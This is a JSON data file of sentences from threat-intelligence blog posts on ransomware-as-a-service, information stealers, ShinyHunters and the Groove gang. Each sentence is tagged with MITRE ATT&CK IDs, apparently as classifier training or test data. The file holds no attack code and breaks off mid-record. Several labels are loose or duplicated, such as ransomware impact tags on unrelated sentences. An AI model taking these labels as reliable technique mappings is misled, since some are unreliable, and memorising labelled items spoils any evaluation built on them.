[{"sentence": "Transportation companies are constantly in the discussions on criminal forums, with nefarious actors attempting (and some succeeding) to attack companies\u2019 infrastructure along their supply chains for their own illegal gains.", "labels": ["T1195"], "document": "intel471_2021-07-14_how-cybercriminals-create-turbulence-for"}, {"sentence": "Intel 471 has [long tracked criminals](https://intel471.com/blog/ransomware-attack-access-merchants-infostealer-escrow-service) who specialize in selling access to compromised systems or stolen information.", "labels": ["T1486"], "document": "intel471_2021-07-14_how-cybercriminals-create-turbulence-for"}, {"sentence": "* Also in January 2021, an actor offered to sell information on a remote code execution (RCE) vulnerability allegedly impacting a European-based cargo airline.", "labels": ["T1190"], "document": "intel471_2021-07-14_how-cybercriminals-create-turbulence-for"}, {"sentence": "The actor sought US $150 for the information about the vulnerability that allegedly could be exploited to exfiltrate several internal documents and access login credentials.", "labels": ["TA0010", "TA0006"], "document": "intel471_2021-07-14_how-cybercriminals-create-turbulence-for"}, {"sentence": "The actor, who was previously engaged in selling compromised remote desktop protocol (RDP) credentials, bought ready-to-use gift cards from other actors, derived them from compromised accounts and sourced access from malware logs.", "labels": ["T1021"], "document": "intel471_2021-07-14_how-cybercriminals-create-turbulence-for"}, {"sentence": "These incidents have all the hallmarks of a ransomware-as-a-service attack, with crews \u201crenting\u201d software to launch the attack, hundreds of gigabytes in data stolen, and calls for million-dollar ransom payments.", "labels": ["T1486", "TA0010", "T1486"], "document": "intel471_2021-07-14_how-cybercriminals-create-turbulence-for"}, {"sentence": "* In March 2021, the operator or operators behind the NEFILIM ransomware-as-a-service affiliate program claimed the compromise of U.S.-based commercial airline Spirit Airlines, leaking 40GB of data with over 33,000 files.", "labels": ["T1486"], "document": "intel471_2021-07-14_how-cybercriminals-create-turbulence-for"}, {"sentence": "[According to open source reporting](https://www.suspectfile.com/florida-compagnia-aerea-spirit-airlines-nuovamente-colpita-da-un-data-breach/), Financial data and other personal information of customers who purchased tickets to fly with the airline between 2006 and 2021 were posted on a name-and-shame blog.", "labels": ["T1491"], "document": "intel471_2021-07-14_how-cybercriminals-create-turbulence-for"}, {"sentence": "* In April 2021, a group using the Mount Locker ransomware attacked the Santa Clara Valley Transportation Authority, stealing about 130 GB of corporate data.", "labels": ["T1486", "TA0010"], "document": "intel471_2021-07-14_how-cybercriminals-create-turbulence-for"}, {"sentence": "The responsible parties are likely an offshoot of those who developed the ransomware, as the organization\u2019s data was posted on a name-and-shame blog operated by a different criminal group.", "labels": ["T1486"], "document": "intel471_2021-07-14_how-cybercriminals-create-turbulence-for"}, {"sentence": "Three ways ransomware-as-a-service has become easier than ever to launch", "labels": ["T1486"], "document": "intel471_2021-07-28_ransomware-as-a-service-fivehands"}, {"sentence": "A big reason why ransomware has grown into such a large cybersecurity problem is because it\u2019s easy for criminals to get involved.", "labels": ["T1486"], "document": "intel471_2021-07-28_ransomware-as-a-service-fivehands"}, {"sentence": "While money and geopolitics play big roles, there are some other means that have allowed ransomware infections to proliferate with little resistance.", "labels": ["T1486"], "document": "intel471_2021-07-28_ransomware-as-a-service-fivehands"}, {"sentence": "Each one covered below can be seen in ransomware attacks that have occurred this year, proving that the cybercrime underground is quick to utilize methods that will ultimately lead to the largest payouts possible.", "labels": ["T1486"], "document": "intel471_2021-07-28_ransomware-as-a-service-fivehands"}, {"sentence": "One such example lies in Babuk, the RaaS variant that was released as \u201copen source\u201d at the end of April.", "labels": ["S0638", "T1486"], "document": "intel471_2021-07-28_ransomware-as-a-service-fivehands"}, {"sentence": "After the builder was posted on the internet in June, it was discovered that it generates pairs of encryption and decryption tools targeting Microsoft Windows systems, VMWare ESXi hypervisors and network-attached storage (NAS) units from both Intel x86 and ARM architectures.", "labels": ["T1486"], "document": "intel471_2021-07-28_ransomware-as-a-service-fivehands"}, {"sentence": "Shortly thereafter lower-level actors took advantage of the builder, launching their own ransomware campaign outside of the Babuk affiliate program.", "labels": ["T1486", "S0638"], "document": "intel471_2021-07-28_ransomware-as-a-service-fivehands"}, {"sentence": "In late June, an operator using info-stealing malware Vidar issued \u201cdownload and execute\u201d tasks to bots, aimed to install the Babuk ransomware variant generated by the builder.", "labels": ["S0638", "T1486", "T1105"], "document": "intel471_2021-07-28_ransomware-as-a-service-fivehands"}, {"sentence": "Another RaaS variant shows that malware code can be used interchangeably.", "labels": ["T1486"], "document": "intel471_2021-07-28_ransomware-as-a-service-fivehands"}, {"sentence": "Intel 471 has observed multiple similarities in the code between Conti ransomware and BazarLoader, malware that grants backdoor access to an infected Windows host.", "labels": ["S0575", "T1486", "S0534", "TA0003"], "document": "intel471_2021-07-28_ransomware-as-a-service-fivehands"}, {"sentence": "One particular similarity is in the code that allows Conti to evade analysis in an isolated instance, such as a sandbox or virtual machine.", "labels": ["S0575", "T1497"], "document": "intel471_2021-07-28_ransomware-as-a-service-fivehands"}, {"sentence": "The code of this function is nearly identical to that used by the BazarLoader, with both functions following the exact logic and executing the same way when searching for hooks.", "labels": ["S0534"], "document": "intel471_2021-07-28_ransomware-as-a-service-fivehands"}, {"sentence": "While these examples are heavy on technical details, they essentially serve as building blocks for malware developers to easily build more efficient versions of ransomware, which in turn allow criminals to demand more money from ransomware victims.", "labels": ["T1486", "T1486", "T1486"], "document": "intel471_2021-07-28_ransomware-as-a-service-fivehands"}, {"sentence": "You can be sure that if you have read about a big vulnerability in the tech press, ransomware operators are aware of the news and will look to take advantage of it as soon as possible.", "labels": ["T1486"], "document": "intel471_2021-07-28_ransomware-as-a-service-fivehands"}, {"sentence": "For instance, Intel 471 has observed the FiveHands ransomware crew looking to utilize vulnerabilities like a [SonicWall buffer overflow vulnerability](https://threatpost.com/sonicwall-botches-critical-vpn-bug/167152/) that wasn\u2019t patched correctly the first time it was uncovered, [a remote code execution vulnerability](https://us-cert.cisa.gov/ncas/current-activity/2021/07/13/vmware-releases-security-update) in VMware\u2019s vSphere Client that was pushed in May 2021, and the two vulnerabilities attached to Microsoft\u2019s [PrintNightmare problem](https://www.cnn.com/2021/07/07/tech/microsoft-security-update/index.html) that are still causing issues for organizations across the world.", "labels": ["S0618", "T1486", "T1190"], "document": "intel471_2021-07-28_ransomware-as-a-service-fivehands"}, {"sentence": "We have not seen these vulnerabilities used in any attacks since being mentioned, but given the need to have access to the domain controller in order to launch a ransomware attack, it may not be long before the group leverages the vulnerability in order to lock an enterprise up for a hefty ransom.", "labels": ["T1486", "T1486"], "document": "intel471_2021-07-28_ransomware-as-a-service-fivehands"}, {"sentence": "Ransomware attacks have evolved to go beyond attackers just locking up an organization\u2019s technology stack and hoping it finds a way to pay up.", "labels": ["T1486"], "document": "intel471_2021-07-28_ransomware-as-a-service-fivehands"}, {"sentence": "Now attackers are looking to cause more problems via double extortion attacks, name-and-shame blogs, or DDoS attacks directed toward any public-facing assets that haven\u2019t been locked up by the initial ransomware attack.", "labels": ["T1499", "T1486", "T1499", "T1486"], "document": "intel471_2021-07-28_ransomware-as-a-service-fivehands"}, {"sentence": "In order for that to happen, RaaS gangs are working with other \u201cexperts\u201d in the cybercrime underground that specialize in various methods that can extend the life of a ransomware attack.", "labels": ["T1486", "T1486"], "document": "intel471_2021-07-28_ransomware-as-a-service-fivehands"}, {"sentence": "Intel 471 observed one such actor working alongside the DarkSide ransomware gang until it shut down [following its attack on the Colonial Pipeline Co](https://edition.cnn.com/2021/06/04/politics/colonial-pipeline-ransomware-attack-password/index.html).in the United States.", "labels": ["T1486"], "document": "intel471_2021-07-28_ransomware-as-a-service-fivehands"}, {"sentence": "The actor claimed to have launched DDoS attacks against DarkSide\u2019s victims for six weeks before the gang\u2019s shutdown.", "labels": ["T1499", "T1499"], "document": "intel471_2021-07-28_ransomware-as-a-service-fivehands"}, {"sentence": "The actor also claimed that 10 to 20 targets were under DDoS at any given time, with attacks lasting from one to 21 days.", "labels": ["T1499", "T1499"], "document": "intel471_2021-07-28_ransomware-as-a-service-fivehands"}, {"sentence": "Over a six month period, the person built enough reputation to latch onto one of the most notorious ransomware gangs in operation, profiting off the million-dollar ransoms DarkSide pulled in before disappearing.", "labels": ["T1486"], "document": "intel471_2021-07-28_ransomware-as-a-service-fivehands"}, {"sentence": "The instances highlighted above are not the sole reason for the rise of ransomware attacks in 2021.", "labels": ["T1486"], "document": "intel471_2021-07-28_ransomware-as-a-service-fivehands"}, {"sentence": "But attacks have moved far beyond sending a malicious link in an email and hoping for an errant click.", "labels": ["T1566"], "document": "intel471_2021-07-28_ransomware-as-a-service-fivehands"}, {"sentence": "Here\u2019s how information stealers pose a threat beyond ransomware", "labels": ["T1486"], "document": "intel471_2021-08-18_information-stealer-ransomware-account-takeover"}, {"sentence": "But in order to do so, they may need to look further than the ransomware itself.", "labels": ["T1486"], "document": "intel471_2021-08-18_information-stealer-ransomware-account-takeover"}, {"sentence": "And by widening that scope, these teams may protect their enterprise beyond the damage that ransomware can cause.", "labels": ["T1486"], "document": "intel471_2021-08-18_information-stealer-ransomware-account-takeover"}, {"sentence": "The activity that Intel 471 analysts observe on the cybercrime underground has changed a bit with the rise of ransomware.", "labels": ["T1486"], "document": "intel471_2021-08-18_information-stealer-ransomware-account-takeover"}, {"sentence": "Malware that has been used for traditional fraud schemes \u2014 particularly information stealers \u2014 has also been co-opted into the cycle of ransomware campaigns.", "labels": ["T1486"], "document": "intel471_2021-08-18_information-stealer-ransomware-account-takeover"}, {"sentence": "While serving a reliable method for criminals to obtain credentials tied to financial accounts, they are now using information stealers to also go after corporate remote network login credentials, like virtual private networks (VPNs) or remote desktop software.", "labels": ["TA0006", "TA0006"], "document": "intel471_2021-08-18_information-stealer-ransomware-account-takeover"}, {"sentence": "Some versions may be solely dedicated to prying credentials away from your workforce, while others may give attackers modules that allow them to fine-tune their attack and possibly introduce longer-term attacks, like ransomware.", "labels": ["T1486", "TA0006", "TA0003"], "document": "intel471_2021-08-18_information-stealer-ransomware-account-takeover"}, {"sentence": "* Intercept data entered into forms in the browser and send them to a malware control server (data exfiltration)", "labels": ["TA0010"], "document": "intel471_2021-08-18_information-stealer-ransomware-account-takeover"}, {"sentence": "* Install other software for malicious use, such as Cobalt Strike (for lateral movement)", "labels": ["S0154", "TA0008", "T1105"], "document": "intel471_2021-08-18_information-stealer-ransomware-account-takeover"}, {"sentence": "* Perform distributed denial of service (DDoS) attacks against different resources, such as a domain or IP address (website downtime)", "labels": ["T1499", "T1499"], "document": "intel471_2021-08-18_information-stealer-ransomware-account-takeover"}, {"sentence": "* Launch a \"stealth\" TeamViewer module that allows remote access to an infected machine (specific targeting)", "labels": ["TA0011"], "document": "intel471_2021-08-18_information-stealer-ransomware-account-takeover"}, {"sentence": "* Drop cryptominers that work to mine cryptocurrency such as Monero (steal computing resources)", "labels": ["T1496"], "document": "intel471_2021-08-18_information-stealer-ransomware-account-takeover"}, {"sentence": "Despite efforts to [dismantle Trickbot\u2019s entire infrastructure](https://intel471.com/blog/trickbot-update-november-2020-bazar-loader-microsoft) in October 2020, We\u2019ve seen updated plug-ins that enable the infamous modular malware platform to handle web injections that look to siphon credentials.", "labels": ["S0266", "T1189", "TA0006"], "document": "intel471_2021-08-18_information-stealer-ransomware-account-takeover"}, {"sentence": "The configuration has been issued to every Trickbot version still in use.", "labels": ["S0266"], "document": "intel471_2021-08-18_information-stealer-ransomware-account-takeover"}, {"sentence": "Additionally, we\u2019ve seen criminals use [malicious document builder EtterSilent](https://intel471.com/blog/ettersilent-maldoc-builder-macro-trickbot-qbot) to spread Trickbot, giving them yet another way to steal enterprise credentials.", "labels": ["S0266", "T1566", "TA0006"], "document": "intel471_2021-08-18_information-stealer-ransomware-account-takeover"}, {"sentence": "Some ransomware crews have looked to own their own \u201cbrand\u201d of information stealers in an attempt to build custom tools that can assist them with a number of different things, including ways to evade anti-malware products.", "labels": ["T1486"], "document": "intel471_2021-08-18_information-stealer-ransomware-account-takeover"}, {"sentence": "In October 2020, a known account on a well-known cybercrime forum linked to the REvil ransomware gang placed a bid for the source code to the KPOT info stealer.", "labels": ["S0496", "T1486"], "document": "intel471_2021-08-18_information-stealer-ransomware-account-takeover"}, {"sentence": "We\u2019ve observed actors advertising web injects that target a host of different banks, including those that specialize in online-only banking.", "labels": ["T1189"], "document": "intel471_2021-08-18_information-stealer-ransomware-account-takeover"}, {"sentence": "* **Behavioral firewalls:** Even the best MFA plan isn\u2019t going to help if your employees come across a malicious attachment in a phishing email or a socially-engineered message on social media.", "labels": ["T1566"], "document": "intel471_2021-08-18_information-stealer-ransomware-account-takeover"}, {"sentence": "While security teams may be laser-focused on preventing a ransomware attack causing a total lockdown of their IT systems, putting other forms of malware on the back burner could leave your enterprise with a serious security problem.", "labels": ["T1486", "T1486"], "document": "intel471_2021-08-18_information-stealer-ransomware-account-takeover"}, {"sentence": "Be it a relative novice or a veteran crew, account takeovers still present a solid revenue stream for anyone who wants to engage in illegal activities, as well as being the key enabler of ransomware attacks.", "labels": ["T1486"], "document": "intel471_2021-08-18_information-stealer-ransomware-account-takeover"}, {"sentence": "Here's how to guard your enterprise against ShinyHunters", "labels": [], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "Since surfacing in April 2020, the group \u2014 which refers to itself as ShinyHunters \u2014 has been behind some of the most notable data breaches that have been made public.", "labels": [], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "With figures estimating the average data breach this year is approximately $4.4 million, we can estimate that ShinyHunters has cost companies tens of millions of dollars in damages this year.", "labels": [], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "As Pok\u00e9mon players hunt and collect \u201cshiny\u201d characters in the game, ShinyHunters collects and resells user data.", "labels": [], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "ShinyHunters tries to obtain legitimate credentials, most likely for a company's cloud services.", "labels": [], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "Intel 471 has also observed ShinyHunters targeting DevOps personnel or GitHub repository companies in order to steal valid OAuth credentials.", "labels": ["T1213"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "These OAuth keys are used to access cloud infrastructure and bypass any two-factor authentication processes that are in place.", "labels": ["T1078"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "![ShinyHunters](https://d39ec1uo9ktrut.cloudfront.net/ShinyHunters-blog-table-v1.png)", "labels": [], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "Additionally, the group will also search a company's GitHub repository source code for vulnerabilities within the code itself.", "labels": ["T1213"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "These vulnerabilities are used in further, more complex, third-party or supply chain attacks.", "labels": ["T1195"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "ShinyHunters may not have as much notoriety as the ransomware groups that are currently causing havoc for enterprises all over the world.", "labels": ["T1486"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "The information ShinyHunters gathers is often turned around and sold on the same underground marketplaces where ransomware actors use it to launch their own attacks.", "labels": ["T1486"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "If enterprises can move to detect activity like ShinyHunters, they in turn can stop ransomware attacks before they are ever launched.", "labels": ["T1486"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "**Reconnaissance** [[TA0043](https://attack.mitre.org/tactics/TA0043/)]", "labels": ["TA0043"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "* Gather Victim Identity Information: Credentials [[T1589.001]](https://attack.mitre.org/techniques/T1589/001/) - Sold unauthorized access credentials containing PII.", "labels": ["T1589", "T1589"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "* Gather Victim Identity Information: Email Addresses [[T1589.002](https://attack.mitre.org/techniques/T1589/002/)] - Sold unauthorized access credentials containing PII.", "labels": ["T1589", "T1589"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "* Phishing for Information [[T1598](https://attack.mitre.org/techniques/T1598/)].", "labels": ["T1598"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "Conducted phishing attacks targeting Microsoft Office 365 corporate users to steal account credentials.", "labels": ["T1598"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "**Initial Access** [[TA0001](https://attack.mitre.org/tactics/TA0001/)]", "labels": ["TA0001"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "* Phishing [[T1566](https://attack.mitre.org/techniques/T1566/)] - Conducted phishing attacks targeting Microsoft Office 365 corporate users to steal account credentials.", "labels": ["T1566", "T1566"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "* Valid Accounts: Domain Accounts [[T1078.002](https://attack.mitre.org/techniques/T1078/002/)], Sold unauthorized access credentials containing PII.", "labels": ["T1078", "T1078"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "* Valid Accounts: Cloud Accounts [[T1078.004](https://attack.mitre.org/techniques/T1078/004/)].", "labels": ["T1078"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "Used AWS keys to obtain further access to cloud services and subsequently dumped databases hosted through AWS.", "labels": ["T1078"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "**Credential Access** [[TA0006](https://attack.mitre.org/tactics/TA0006)]", "labels": ["TA0006"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "* Steal Application Access Tokens [[T1528](https://attack.mitre.org/techniques/T1528)] - Leveraged stolen Amazon Web Services (AWS) keys.", "labels": ["T1528", "T1528"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "**Discovery** [[TA0007](https://attack.mitre.org/tactics/TA0007)]", "labels": ["TA0007"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "* Cloud Infrastructure Discovery [[T1580](https://attack.mitre.org/techniques/T1580)] - Reset passwords for accounts with access to the victim organization\u2019s GitHub software repository system and sought Amazon Web Services (AWS) keys.", "labels": ["T1580", "T1580"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "**Lateral Movement** [[TA0008](https://attack.mitre.org/tactics/TA0008)]", "labels": ["TA0008"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "* Exploitation of Remote Services [[T1210](https://attack.mitre.org/techniques/T1210)] - Searched GitHub repository for OAuth keys and used them to move laterally to a cloud service.", "labels": ["T1210", "T1210"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "* Software Deployment Tools [[T1072](https://attack.mitre.org/techniques/T1072)] - Used GitHub repository.", "labels": ["T1072", "T1072"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "**Collection** [[TA0009](https://attack.mitre.org/tactics/TA0009)]", "labels": ["TA0009"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "* Data from Cloud Storage Object [[T1530](https://attack.mitre.org/techniques/T1530)] - Used AWS keys to obtain further access to cloud services and subsequently dumped databases hosted through AWS.", "labels": ["T1530", "T1530"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "* Data from Information Repositories [[T1213](https://attack.mitre.org/techniques/T1213)].", "labels": ["T1213"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "Searched GitHub repository for OAuth keys and used them to move laterally to a cloud service.", "labels": ["T1213", "T1567"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "**Exfiltration** [[TA0010](https://attack.mitre.org/tactics/TA0010)]", "labels": ["TA0010"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "* Exfiltration Over Web Service [[T1567](https://attack.mitre.org/techniques/T1567)].", "labels": ["T1567"], "document": "intel471_2021-08-23_shinyhunters-data-breach-mitre-attack"}, {"sentence": "How Groove Gang is shaking up the Ransomware-as-a-Service market to empower affiliates", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "McAfee Enterprise ATR believes, with high confidence, that the Groove gang is associated with the Babuk gang, either as a former affiliate or subgroup.", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "These cybercriminals are happy to put aside previous Ransomware-as-a-Service hierarchies to focus on the ill-gotten gains to be made from controlling victim\u2019s networks, rather than the previous approach which prioritized control of the ransomware itself.", "labels": ["T1486", "TA0011"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "For many years the world of Ransomware-as-a-Service (RaaS) was perceived as a somewhat hierarchical and structured organization.", "labels": ["T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Ransomware developers would advertise their RaaS program on forums and gracefully open up slots for affiliates to join their team to commit crime.", "labels": ["T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "The RaaS admins would conduct interviews with potential affiliates to make sure they were skilled enough to participate.", "labels": ["T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Historically, i.e., with [CTB locker](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/advanced-threat-research/), the emphasis was on affiliates generating enough installs via a botnet, exploit kits or stolen credentials, but it has shifted in recent years to being able to penetrate and compromise a complete network using a variety of malicious and non-malicious tools.", "labels": ["T1189", "T1589"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Recruitment posting for REvil from 2020", "labels": ["S0496"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "While criminals collaborating in the world of cybercrime [isn\u2019t a new concept](https://research-information.bris.ac.uk/ws/portalfiles/portal/194364696/DEVIANT\\_SECURITY\\_EHAVANDESANDT.pdf), a RaaS group\u2019s hierarchy is more rigid compared to other forms of cybercrime, due to the power imbalance between the group\u2019s developers/admins and affiliates.", "labels": ["T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "For a long time, RaaS admins and developers were prioritized as the top targets, often neglecting the affiliates since they were perceived as less-skilled.", "labels": ["T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "This, combined with the lack of disruptions in the RaaS ecosystem, created an atmosphere where those lesser-skilled affiliates could thrive and grow into very competent cybercriminals.", "labels": ["T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Recently we have observed certain events that might be the beginning of a new chapter in the RaaS ecosystem.", "labels": ["T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "### Cracks in the RaaS model", "labels": ["T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Recently, a former Conti affiliate was unhappy with their financial portion and decided to disclose the complete Conti attack playbook and their Cobalt Strike infrastructure online, as shown in the screenshot below.", "labels": ["S0575", "S0575", "S0154"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Disgruntled Conti affiliate", "labels": ["S0575"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "In the past, ATR has been approached by individuals affiliated with certain RaaS groups expressing grudges with other RaaS members and admins, claiming they haven't been paid in time or that their share wasn't proportionate to the amount of work they put in.", "labels": ["T1486", "T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Moreover, the popular cybercrime forums have banned ransomware actors from advertising since the Colonial Pipeline attack.", "labels": ["T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "The lack of visibility has made it harder for RaaS groups to establish or maintain credibility and will make it harder for RaaS developers to maintain their current top tier position in the underground.", "labels": ["T1486", "T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "After a turbulent shutdown of Babuk and the fallout from the Colonial Pipeline and Kaseya attacks, it seems that some of the ransomware-affiliated cybercriminals have found a home in a forum known as RAMP.", "labels": ["S0638", "T1195"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "A RAMP post authored by Orange, introducing Groove and explaining relationships", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "It\u2019s Groove whom the babuk ransomware needs to thank for its fame.", "labels": ["S0638", "T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "> Groove rocks, and babuk stinks :)", "labels": ["S0638"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "> Challenge: Using a PHP stack+MYSQL+Bootstrap, code a standard ransomware operators\u2019 blog in THE RUSSIAN LANGUAGE with the following pages:", "labels": ["T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "> Use standard display, just like other ransomware operators\u2019 blogs do.", "labels": ["T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "> 2) Groove has never had a ransomware product, nor will that ever change.", "labels": ["T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "> 3) The babuk team doesn\u2019t exist.", "labels": ["S0638"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "We rented the ransomware from a coder who could not shoulder the responsibility, got too scared and decided to leave an error in the ESX builder \u2014 naturally, to give us a reason to chuck him out (his motives.Fxxx if I know)", "labels": ["T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "> babuk 2.0, which hit the headlines, is not to be taken seriously and must be regarded as nothing but a very stupid joke", "labels": ["S0638"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "This actor claimed the forum would specifically cater to other ransomware-related threat actors after they were ousted from major cybercrime forums for being too toxic, following the high-profile ransomware attacks against the Colonial Pipeline and Washington D.C.\u2019s Metropolitan Police Department in the spring of 2021.", "labels": ["T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "The forum was initially launched on the same TOR-based resource that previously hosted a name-and-shame blog operated by the Babuk ransomware gang and the Payload.bin marketplace of leaked corporate data.", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "We found a posting from where the names Orange and Darkside are mentioned as potential monikers.", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Based on ATR's previous research, we believe the name Orange was chosen as a tribute to REvil/GandCrab.", "labels": ["S0496"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "However, there was a less well known REvil affiliate admin named Orange.", "labels": ["S0496"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "A tribute seems fitting here as these successful ransomware families, GandCrab and REvil, shaped the RaaS ecosystem as we know it today.", "labels": ["T1486", "S0496", "T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "However, REvil insiders will recognize the name Orange as one of their admins.", "labels": ["S0496"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Based on ATR\u2019s closed-source underground research, we believe with a high level of confidence, that UNKN was indeed linked to the aforementioned accounts, as well as the infamous \u201cCrab\u201d handle used by GandCrab.", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Crab was one of the two affiliate-facing accounts that the GandCrab team had (The other being Funnycrab).", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "We believe with a high level of confidence that after the closure of GandCrab, the individual behind the Funnycrab account changed to the account name to Orange and continued operations with REvil, with only a subset of skilled GandCrab affiliates, (as described in this Virus Bulletin 2019 [whitepaper](https://www.virusbulletin.com/blog/2019/11/vb2019-paper-different-ways-cook-crab-gandcrab-ransomware-service-raas-analysed-depth/)) since GandCrab grew too big and needed to shed some weight.", "labels": ["S0496"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "### Groove Gang", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Groove claims several of Babuk\u2019s victims, including the Metropolitan Police Department, brought them a lot of attention.", "labels": ["S0638"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "The several mentions to Babuk isn\u2019t by mistake: we have evidence the two groups also have connections, which we\u2019ve pieced together from examining the behavior of \u2014 and particularly the fallout between \u2014 the two groups.", "labels": ["S0638"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Originally, the Babuk gang paid affiliates by each victim they attacked.", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Instead, their focus shifted to data exfiltration and extortion of targeted organizations.", "labels": ["TA0010"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "That was followed by the group [releasing](https://www.bleepingcomputer.com/news/security/babuk-ransomware-is-back-uses-new-version-on-corporate-networks/) the builder for the old versions of its ransomware as it pivoted to a new one for themselves.", "labels": ["T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "The attention that Babuk drew by hacking and extorting the Metropolitan Police Department meant their brand name became widely known.", "labels": ["S0638"], "document": 